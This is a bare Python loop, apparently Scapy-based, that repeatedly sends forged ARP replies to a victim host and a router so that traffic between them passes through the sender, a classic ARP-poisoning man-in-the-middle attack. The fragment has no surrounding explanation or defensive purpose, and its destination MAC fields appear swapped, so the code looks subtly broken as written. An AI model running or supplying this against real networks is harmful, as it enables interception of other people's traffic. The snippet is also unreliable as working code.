while 1:
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=routerMAC))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=victimMAC))
	time.sleep(1.5)








